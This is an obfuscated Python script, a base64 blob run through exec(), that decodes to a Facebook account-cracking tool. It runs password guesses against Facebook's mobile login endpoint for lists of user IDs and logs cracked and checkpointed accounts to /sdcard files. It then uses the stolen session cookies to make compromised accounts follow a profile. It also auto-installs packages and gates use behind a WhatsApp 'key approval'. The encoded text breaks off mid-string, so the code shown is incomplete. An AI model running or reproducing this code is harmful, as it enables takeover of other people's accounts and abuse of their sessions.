import base64
exec(base64.b64decode("aW1wb3J0IG9zCgp0cnk6CgogICAgaW1wb3J0IHJlcXVlc3RzCgpleGNlcHQgSW1wb3J0RXJyb3I6CgogICAgcHJpbnQoJ1xuIFvinJNdIGluc3RhbGxpbmcgcmVxdWVzdHMgIS4uLlxuJykKCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKCnRyeToKCiAgICBpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCgpleGNlcHQgSW1wb3J0RXJyb3I6CgogICAgcHJpbnQoJ1xuIFvinJNdIGluc3RhbGxpbmcgZnV0dXJlcyAhLi4uXG4nKQoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgZnV0dXJlcycpCgp0cnk6CgogICAgaW1wb3J0IGJzNAoKZXhjZXB0IEltcG9ydEVycm9yOgoKICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGJzNCAhLi4uXG4nKQoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykKCmltcG9ydCByZXF1ZXN0cywgb3MsIHJlLCBiczQscGxhdGZvcm0sIHN5cywganNvbiwgdGltZSwgcmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgdGhyZWFkaW5nLCBpdGVydG9vbHMsYmFzZTY0LHV1aWQsemxpYgoKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBzYXJmcmF6c3NiCgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQoKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAKCmN0ID0gZGF0ZXRpbWUubm93KCkKCm4gPSBjdC5tb250aAoKYnVsYW4gPSBbJ0phbnVhcnknLCAnRmVicnVhcnknLCAnTWFyY2gnLCAnQXByaWwnLCAnTWF5JywgJ0p1bmUnLCAnSnVseScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPY3RvYmVyJywgJ05vdmVtYmVyJywgJ0RlY2VtYmVyJ10KCnRyeToKCiAgICBpZiBuIDwgMCBvciBuID4gMTI6CgogICAgICAgIGV4aXQoKQoKICAgIG5UZW1wID0gbiAtIDEKCmV4Y2VwdCBWYWx1ZUVycm9yOgoKICAgIGV4aXQoKQoKY3VycmVudCA9IGRhdGV0aW1lLm5vdygpCgp0YSA9IGN1cnJlbnQueWVhcgoKYnUgPSBjdXJyZW50Lm1vbnRoCgpoYSA9IGN1cnJlbnQuZGF5CgpvcCA9IGJ1bGFuW25UZW1wXQoKUCA9ICdceDFiWzE7OTdtJyAjIAoKTSA9ICdcMDMzWzE7MzFtJyAjIAoKSCA9ICdcMDMzWzE7MzJtJyAjIAoKSyA9ICdceDFiWzE7OTdtJyAjIAoKQiA9ICdceDFiWzE7OTdtJyAjIAoKVSA9ICdceDFiWzE7OTdtJyAjIAoKTyA9ICdceDFiWzE7OTdtJyAjIAoKTiA9ICdceDFiWzBtJyAgICAjIAoKbXlfY29sb3IgPSBbCgogUCwgTSwgSCwgSywgQiwgVSwgTywgTl0KCndhcm5hID0gcmFuZG9tLmNob2ljZShteV9jb2xvcikKCmRhdGEsZGF0YTI9e30se30KCmFtYW4sY3Asc2FsYWg9MCwwLDAKCnViYWhQLGZ1Y2sscHdCYXJ1PVtdLFtdLFtdCgpvayA9IFtdCgpjcCA9IFtdCgppZCA9IFtdCgp1c2VyID0gW10KCmxvb3AgPSAwCgp1cmxfbG9va3VwID0gImh0dHBzOi8vbG9va3VwLWlkLmNvbS8iCgp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSIKCnVybF9pcCA9ICJodHRwczovL3d3dy5odHRwYmluLm9yZy9pcCIKCmhlYWRlcl9ncnVwID0geyJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTNfNF8xIGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgTW9iaWxlLzE1RTE0OCBbRkJBTi9GQklPUztGQkRWL2lQaG9uZTEyLDE7RkJNRC9pUGhvbmU7RkJTTi9pT1M7RkJTVi8xMy40LjE7RkJTUy8yO0ZCSUQvcGhvbmU7RkJMQy9lbl9VUztGQk9QLzVdIn0KCmJ1bGFuX3R0bCA9IHsiMDEiOiAiSmFudWFyeSIsICIwMiI6ICJGZWJydWFyeSIsICIwMyI6ICJNYXJjaCIsICIwNCI6ICJBcHJpbCIsICIwNSI6ICJNYXkiLCAiMDYiOiAiSnVuZSIsICIwNyI6ICJKdWx5IiwgIjA4IjogIkF1Z3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPY3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlY2VtYmVyIn0KCmRvbmUgPSBGYWxzZQoKZGVmIGphbGFuKHopOgoKICAgIGZvciBlIGluIHogKyAnXG4nOgoKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpCgogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQoKICAgICAgICB0aW1lLnNsZWVwKDAuMDEpCgogICAgICAgIAoKZGVmIG1haW5fYXB2KCk6CgogICAgaW10PSIxMTBZPT0iCgogICAgYWs9IlpFRVNIU0gtMSIKCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKCiAgICBwcmludChsb2dvKQoKICAgIHRyeToKCiAgICAgICAga2V5MT1vcGVuKCcvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2Jpbi8uYWtra2stY292JywgJ3InKS5yZWFkKCkKCiAgICBleGNlcHQgSU9FcnJvcjoKCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCgogICAgICAgIHByaW50KGxvZ28pCgogICAgICAgIHByaW50ICgiWyRdfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+WyRdIikKCiAgICAgICAgcHJpbnQgKCIgIFlvdXIgVG9rZW4gSXMgTm90IEFwcHJvdmVkIEFscmVhZHkiKQoKICAgICAgICBwcmludCAoIlskXX5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+flskXSIpCgogICAgICAgIHByaW50ICgiICAgICAgICAgICBUSElTIElTIFlPVVIgS0VZIikKCiAgICAgICAgcHJpbnQgKCJbJF1+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5bJF0iKQoKICAgICAgICBwcmludCAoIiIpCgogICAgICAgIG15aWQ9dXVpZC51dWlkNCgpLmhleFs6MTBdLnVwcGVyKCkKCiAgICAgICAgcHJpbnQgKCIgICAgICAgICAgWU9VUiBLRVkgOiAiK2FrK215aWQraW10KQoKICAgICAgICBwcmludCAoIlskXX5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+flskXSIpCgogICAgICAgIGtvaz1vcGVuKCcvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2Jpbi8uYWtra2stY292JywgJ3cnKQoKICAgICAgICBrb2sud3JpdGUobXlpZCtpbXQpCgogICAgICAgIGtvay5jbG9zZSgpCgogICAgICAgIHByaW50ICgiIikKCiAgICAgICAgcHJpbnQgKCIiKQoKICAgICAgICBwcmludCAoIiAgICAgQ29weSBLZXkgQW5kIFNlbnQgTWUgV2hhdHNBcHAgQXBwcm92ZWwgWW91ciBLZXkgIikKCiAgICAgICAgcHJpbnQgKCJbJF1+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5bJF0iKQoKICAgICAgICB0aW1lLnNsZWVwKDMuNSkKCiAgICAgICAgdGtzID0gJ0RlYXIlMjBBZG1pbiwlMjBQbGVhc2UlMjBBcHByb3ZlZCUyME15JTIwVG9rZW4lMjBUbyUyMFByZW1pdW0lMjAlIDIwJSAyMCUyMCUyME15JTIwJTIwS2V5JTIwJTIwOiUyMCcrYWsrJycrbXlpZCsnJytpbXQKCiAgICAgICAgb3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys5MjMwNDcyNzQzOTM/dGV4dD0nICsgdGtzKQoKICAgICAgICAKCiAgICByMT1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ2l0aHViLmNvbS9OQVpJUktIQU5LSEFOL01aUi9ibG9iL21haW4vei50eHQiKS50ZXh0CgogICAgaWYga2V5MSBpbiByMToKCiAgICAgICAgUigpCgogICAgZWxzZToKCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCgogICAgICAgIHByaW50KGxvZ28pCgogICAgICAgIHByaW50ICgiWyRdfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+WyRdIikKCiAgICAgICAgcHJpbnQgKCIgIFlvdXIgVG9rZW4gSXMgTm90IEFwcHJvdmVkIEFscmVhZHkiKQoKICAgICAgICBwcmludCAoIlskXX5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+flskXSIpCgogICAgICAgIHByaW50ICgiICAgICAgICAgIFRISVMgSVMgWU9VUiBLRVkgQlJPIikKCiAgICAgICAgcHJpbnQgKCJbJF1+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5bJF0iKQoKICAgICAgICBwcmludCAoIiAgICAgICAgICBZT1VSIEtFWSA6ICIrYWsra2V5MSkKCiAgICAgICAgcHJpbnQgKCJbJF1+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5bJF0iKQoKICAgICAgICBwcmludCAoIiAgICAgQ29weSBLZXkgQW5kIFNlbnQgTWUgV1AgQXBwcm92ZWwgWW91ciBLZXkgIikKCiAgICAgICAgcHJpbnQgKCJbJF1+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5bJF0iKQoKICAgICAgICB0aW1lLnNsZWVwKDMuNSkKCiAgICAgICAgdGtzID0gJ0RlYXIlMjBBZG1pbiwlMjBQbGVhc2UlMjBBcHBvcnZlZCUyME15JTIwS2V5JTIwVG8lMjBQcmVtaXVt4pyT4pyTJTIwJTIwJTIwJTIwJTIwTXklMjAlMjBLZXklMjAlMjA6JTIwJythaysnJytrZXkxCgogICAgICAgIG9zLnN5c3RlbSgnYW0gc3RhcnQgaHR0cHM6Ly93YS5tZS8rOTIzMDQ3Mjc0MzkzP3RleHQ9JyArIHRrcykKCmxvZ289IiIiXDAzM1sxOzM3bQoKIFwwMzNbMTszMm0gICAgICAgICAKCiAgICAgICAgICAg4paI4paI4paIICAgIOKWiOKWiOKWiCDilojilojilojilojilojilojilogg4paI4paI4paI4paI4paI4paIICAKXDAzM1sxOzMxbSAgICAgICAgICAg4paI4paI4paI4paIICDilojilojilojiloggICAg4paI4paI4paIICDilojiloggICDilojiloggClwwMzNbMTszM20gICAgICAgICAgIOKWiOKWiCDilojilojilojilogg4paI4paIICAg4paI4paI4paIICAg4paI4paI4paI4paI4paI4paIICAKICAgICAgICAgICDilojiloggIOKWiOKWiCAg4paI4paIICDilojilojiloggICAg4paI4paIICAg4paI4paIIApcMDMzWzE7MzRtICAgICAgICAgICDilojiloggICAgICDilojilogg4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiCAgIOKWiOKWiCAKCi4uLi4uLi4uOjo6Li46Ojo6Oi4uOjouLi4uLi4uLjo6Oi4uLi4uLi46Ojo6Li4uLi4uOjo6Li46Ojo6Oi4uOjo6OjoKCgoKIFskXX5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+flskXQoKICAgIEF1dGhvciAgIDogWkVFU0hBTiBBSE1BRAoKICAgIEZhY2Vib29rIDogZmFjZWJvb2suY29tL1plZXNoYW5BaG1hZAoKICAgIENvbm5lY3QgIDogMDMwNDcyNzQzOTMKCgogWyRdfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+WyRdCgogXDAzM1sxOzMybSBVc2UgKEFpcnBsYW5lKSBNb2QgRXZlcnkgMTAgTWluIEZvciBHZXQgTW9yZSBPayBpRHogXDAzM1sxOzMybQoKIFskXX5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+flskXSIiIiAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKZGVmIGhhc2lsKE9LLGNwKToKCglpZiBub3QgbGVuKE9LKSAhPSAwOgkgICAgcGFzcwoKCWlmIGxlbihjcCkgIT0gMDoKCgkgICAgcHJpbnQoJ1xuXG4gIFx4MWJbMTs5N20gVG90YWwgT0sgOiBceDFiWzE7OTdtICVzICBceDFiWzE7OTdtL3NkY2FyZC9aZWVzaHNoLU9LLnR4dCcgJSAoSCwgUCwgc3RyKGxlbihvaykpKSkKCgkgICAgcHJpbnQoJyAgXHgxYlsxOzk3bSBUb3RhbCBDUCA6XHgxYlsxOzk3bSAgICVzIFx4MWJbMTs5N20vc2RjYXJkL1plZXNoc2gtQ1AudHh0JyAlIChILCBQLCBzdHIobGVuKGNwKSkpKQoKCSAgICBpbnB1dCgiXHgxYlsxOzk3bVByZXNzIGVudGVyIHRvIGJhY2sgQWhtYWQgTWVudSAiKQoKCSAgICBSKCkKCgkJCgpkZWYgUigpOgoKCQkJb3Muc3lzdGVtKCJjbGVhciIpCgoJCQlwcmludChsb2dvKQoKCQkJcHJpbnQoIiAgICAgICAgICAgICAgIFwwMzNbMTs5Mm3igKIgUHJlbWl1bSDigKIgXDAzM1sxOzk3bSIpCgoJCQlwcmludCAoJyBbJF1+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5bJF0nKQoKCQkJcHJpbnQgKCJcMDMzWzFtIFshXSBUb29sICAgIDogWmVlc2hhbiBBaG1hZCIpCgoJCQlwcmludCAoIiBbIV0gQnJhbmQgICA6IFpFRVNIU0giKQoKCQkJcHJpbnQoIiBbIV0gRXhwaXJlZCA6IE5vIGxpbWl0IikKCgkJCXByaW50ICgiIFshXSBTdGF0dXMgIDogXDAzM1sxOzkybUZyZWVcMDMzWzE7OTdtIikKCgkJCXByaW50ICgnIFskXX5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+flskXScpCgoJCQlwcmludCgiIFsxXSBTdGFydCBDcmFja2luZyAgIikKCgkJCXByaW50KCIgWzJdIENyZWF0ZSBTdXBwZXIgRmlsZSBbIFVsdGltYXRlIF0iKQoKCQkJcHJpbnQoIiBbM10gRmVlZGJhY2siKQoKCQkJcHJpbnQoIiBbNF0gV2hhdHNBcHAgR3JvdXAiKQoKCQkJcHJpbnQoIiBbNV0gTXkgRmFjZWJvb2sgSWQgIikKCgkJCXByaW50ICgiIFswXSBFeGl0IFByb2dyYW1pbmciKQoKCQkJcHJpbnQgKCcgWyRdfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+WyRdJykKCgkJCWtleSA9IGlucHV0KCIgWypdIENob29zZSA6ICIpCgoJCQlwcmludCAoJyBbJF1+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5bJF0nKQoKCQkJaWYga2V5IGluIFsiIl06CgoJCQkJcHJpbnQgKCIgWyFdIFBsZWFzZSBTZWxlY3QgQ29ycmVjdCBPcHRpb24iKQoKCQkJCWV4aXQoKQoKCQkJZWxpZiBrZXkgaW4gWyIxIiwgIjAxIl06CgoJCQkJX194eHhfXygpLmltdGlheihpZCkKCgkJCWVsaWYga2V5IGluIFsiMiIsICIwMiJdOgoKCQkJCQoKCQkJCW9zLnN5c3RlbSgncHl0aG9uIER1bXAucHknKQoKCQkJZWxpZiBrZXkgaW4gWyIzIiwgIjAzIl06CgoJCQkJCgoJCQkJZHVwY3V0dGVyKCkKCgkJCWVsaWYga2V5IGluIFsiNCIsICIwNCJdOgoKCQkJCQoKCQkJCW9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9jaGF0LndoYXRzYXBwLmNvbS8iKQoKCQkJCVIoKQoKCQkJZWxpZiBrZXkgaW4gWyI1IiwgIjA1Il06CgoJCQkJdGltZS5zbGVlcCgwLjUpCgoJCQkJeXQoKQoKCQkJCVIoKQoKCQkJCWxvZ2luKCkKCgkJCWVsaWYga2V5IGluIFsiMCIsICIwMCIgLCAiNiJdOgoKCQkJCXRpbWUuc2xlZXAoMC41KQoKCQkJCWV4aXQoIlxuIFvinJNdIFRoYW5rIFlvdVxuIikKCmNsYXNzIF9feHh4X186CgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgoKICAgICAgICBzZWxmLmlkID0gW10KCiAgICBkZWYgaW10aWF6KHNlbGYsYWspOgoKICAgICAgICBpZiAxIGluIGZ1Y2s6CgogICAgICAgICAgICBvcy5zeXN0ZW0oJyMnKQoKICAgICAgICAKCiAgICAgIAoKICAgICAgICAKCiAgICAgICAgc2VsZi5jbnQgPSBpbnB1dCgnIFsqXSBQdXQgRmlsZSBOYW1lIDogJykKCiAgICAgICAgc2VsZi5pZCA9IG9wZW4oc2VsZi5jbnQpLnJlYWQoKS5zcGxpdGxpbmVzKCkKCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCgogICAgICAgIHByaW50KGxvZ28pCgogICAgICAgIHByaW50KCIiKQoKICAgICAgICBfX193b3JsZHdpZGVfX18gPSAoJ3knKQoKICAgICAgICBpZiBfX193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToKCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQoKICAgICAgICBlbHNlOgoKICAgICAgICAgICAgcHJpbnQoJyBbIV0gQ2hvb3NlIENvcnJlY3QgT25lJyk7CgogICAgICAgICAgICBzZWxmLnNhcmZyYXp4KGlkKQoKICAgIGRlZiBfX21ldG9kZV9fKHNlbGYsIHVzZXIsIF9fY2hpX18sIGNlYm9rKToKCiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3AKCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyIFx4MWJbMTszM21bWmVlaHNoc2hdXHgxYlsxOzMzbSB7bG9vcH18e2xlbihzZWxmLmlkKX0gXHgxYlsxOzMybVtva11be2xlbihvayl9XSAiKQoKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKCiAgICAgICAgdHJ5OgoKICAgICAgICAgICAgZm9yIHB3IGluIF9fY2hpX186CgogICAgICAgICAgICAgICAgcHcgPSBwdy5sb3dlcigpCgogICAgICAgICAgICAgICAgc2Vzc2lvbj1yZXF1ZXN0cy5TZXNzaW9uKCkKCiAgICAgICAgICAgICAgICBoZWFkZXIgPSB7CgogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywKCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwKCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJOb2tpYUM1LTA1LzIyLjUuMDA3IChTeW1iaWFuT1MvOS40OyBVOyBTZXJpZXM2MC81LjAgTW96aWxsYS81LjA7IFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSApIEFwcGxlV2ViS2l0LzUyNSAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS81MjUgM2dwcC1nYmErIiwKCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsCgogICAgICAgICAgICAgICAgICAgICJkbnQiOiIxIiwKCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsCgogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwKCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsCgogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwKCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLAoKICAgICAgICAgICAgICAgICAgICAicmVmZXJlciI6Imh0dHBzOi8vbS5mYWNlYm9vay5jb20vIiwKCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAoKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiCgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpCgogICAgICAgICAgICAgICAgZGFzID0gewoKICAgICAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwKCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwKCiAgICAgICAgICAgICAgICAgICAgInVpZCI6dXNlciwKCiAgICAgICAgICAgICAgICAgICAgImZsb3ciOiJsb2dpbl9ub19waW4iLAoKICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsCgogICAgICAgICAgICAgICAgICAgICJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8iCgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7CgogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywKCiAgICAgICAgICAgICAgICAgICAgImNhY2hlLWNvbnRyb2wiOiJtYXgtYWdlPTAiLAoKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAoKICAgICAgICAgICAgICAgICAgICAib3JpZ2luIjoiaHR0cHM6Ly8iK2NlYm9rLAoKICAgICAgICAgICAgICAgICAgICAiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwKCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoaVBob25lOyBDUFUgaVBob25lIE9TIDEzXzRfMSBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIE1vYmlsZS8xNUUxNDggW0ZCQU4vRkJJT1M7RkJEVi9pUGhvbmUxMiwxO0ZCTUQvaVBob25lO0ZCU04vaU9TO0ZCU1YvMTMuNC4xO0ZCU1MvMjtGQklEL3Bob25lO0ZCTEMvZW5fVVM7RkJPUC81XSIsCgogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLAoKICAgICAgICAgICAgICAgICAgICAieC1yZXF1ZXN0ZWQtd2l0aCI6IlhNTEh0dHBSZXF1ZXN0IiwKCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLAoKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwKCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLAoKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsCgogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly8iK2NlYm9rKyIvaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsCgogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwKCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44IgoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwbyA9IHNlc3Npb24ucG9zdChmImh0dHBzOi8ve2NlYm9rfS9sb2dpbi9kZXZpY2UtYmFzZWQvdmFsaWRhdGUtcGFzc3dvcmQvP3NoYmw9MCIsIGRhdGEgPSBkYXMsIGhlYWRlcnMgPSBoZWFkZXIxLCBhbGxvd19yZWRpcmVjdHMgPSBGYWxzZSkKCiAgICAgICAgICAgICAgICBpZiAnY191c2VyJyBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToKCiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQoKICAgICAgICAgICAgICAgICAgICBwcmludChmIlxye0h9IFtaZWVzaGFuLW9rIPCfpKtdIHt1c2VyfSB8IHtwd30iKQoKICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCgogICAgICAgICAgICAgICAgICAgIG9rLmFwcGVuZCh3cnQpCgogICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvWmVlc2hhbl9PSy50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpCgogICAgICAgICAgICAgICAgICAgIHNlbGYuZm9sbG93KHNlc3Npb24sY29raSkKCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToKCiAgICAgICAgICAgICAgICAgICAgdHJ5OgoKICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW56ID0gb3BlbignLnRva2VuLnR4dCcpLnJlYWQoKQoKICAgICAgICAgICAgICAgICAgICAgICAgY3BfdHRsID0gc2Vzc2lvbi5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dXNlcn0/ZmllbGRzPWJpcnRoZGF5JmFjY2Vzc190b2tlbj17dG9rZW59JykuanNvbigpWydiaXJ0aGRheSddCgogICAgICAgICAgICAgICAgICAgICAgICBtb250aCwgZGF5LCB5ZWFyID0gY3BfdHRsLnNwbGl0KCcvJykKCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQoKICAgICAgICAgICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZSx3KQoKICAgICAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkKCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvWmVlc2hhbl9DUC50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpCgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gJycKCiAgICAgICAgICAgICAgICAgICAgICAgIGRheSAgID0gJycKCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycKCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c3IsdykKCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkKCiAgICAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9aZWVzaGFuX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgICAgICAgICBlbHNlOgoKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgbG9vcCs9MQoKICAgICAgICBleGNlcHQ6CgogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQoKICAgIGRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6CgogICAgICAgIHIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vQWxpQmFsb2No